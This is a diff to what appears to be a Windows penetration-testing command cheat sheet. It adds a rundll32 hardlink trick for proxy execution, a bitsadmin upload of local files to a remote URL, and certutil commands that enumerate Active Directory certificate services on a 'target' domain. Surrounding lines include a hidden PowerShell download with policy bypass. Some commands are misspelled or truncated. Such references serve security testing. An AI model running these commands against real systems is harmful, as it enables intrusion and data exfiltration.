@@ -138,7 +138,8 @@ fsutil fsinfo drives
 dir /a /s c:\ |find /c /v "svchost"
 tree C:\ /f /a > C:\Users\myself\Documents\tree.txt
 command | find /c /v “”
-	Counts the lines of whatever you use for ‘command’
+New-Item -ItemType HardLink -Path "\Users\uname\appdata\blahblah\rundll32.lnk" -Target "\windows\SysWOW64\rundll32.exe"
+	-create a hardlink on the filesystem to execute another command on the system by passing reference or in a command line by invoking the alias of the link's name
 	
 
 File Transfer	
@@ -146,6 +147,7 @@ iexplore.exe http://blah.com/filename.zip
 C:\windows\explorer.exe http://somewhere.com/filename.ext
 ftp ftp.site.dom
 bitsadmin /transfer systemrepair /download /priority normal http://path/to/file c:\path\local\file
+bitsadmin /transfer blahblah /upload /priority low http://path/to/file c:\path\local\file
 powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"
 net use Z: \\netbios_name\share /PERSISTENT:YES
 	-connect to network drive
@@ -367,6 +369,20 @@ certutil -decode hw-encoded_file.ext stdout.txt
 certutil -deoodehex hex.xxd plain.txt
 	--decode hex-encoded input
 certutil -encodehex plain.txt hex.xxd
+
+Certificate Chain Management
+certutil -v -template
+	-dump certificate templates+settings from CA
+certutil -getcrl a:\targetrootca.crl
+	-copy crltofile
+certutil -viewstore "ldap:///CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=target,DC=com?cACertificate?base?objectclass=certificationAuthority"
+	-view AIA container for Active Directory Domain Services for target.com domain
+certutil -enterprise -viewstore CA
+	-view intermediate CA cert store contents
+certutil -viewstore "ldap:///CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,
+	-view NTAuth container store contents
+cetutil -enterprise -viewstore Root
+	-view trusted root CAs
 
 
 INTERESTING FILES
